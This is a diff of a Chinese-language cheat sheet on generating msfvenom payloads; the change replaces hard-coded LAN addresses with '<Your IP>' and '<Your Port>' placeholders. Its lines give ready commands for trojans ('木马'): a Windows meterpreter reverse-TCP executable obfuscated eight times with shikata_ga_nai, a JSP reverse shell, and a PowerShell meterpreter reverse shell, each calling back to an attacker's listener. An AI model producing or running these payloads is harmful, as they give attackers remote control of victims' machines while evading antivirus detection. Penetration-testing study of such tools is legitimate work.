@@ -10,10 +10,10 @@ lport  后跟监听的端口
 -i  混淆次数
 -e  混淆模式
 例如：exe木马：
-      msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.15.131 lport=4444 -f exe -o /root/virus.exe -e x86/shikata_ga_nai -i 8
+      msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your IP> lport=<Your Port> -f exe -o /root/virus.exe -e x86/shikata_ga_nai -i 8
 	  
       jsp木马：
-	  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.128 LPORT=4444 -f raw > test.jsp
+	  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw > test.jsp
 	  
 	  #Powershell木马:
       msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f psh-reflection > psl.psl
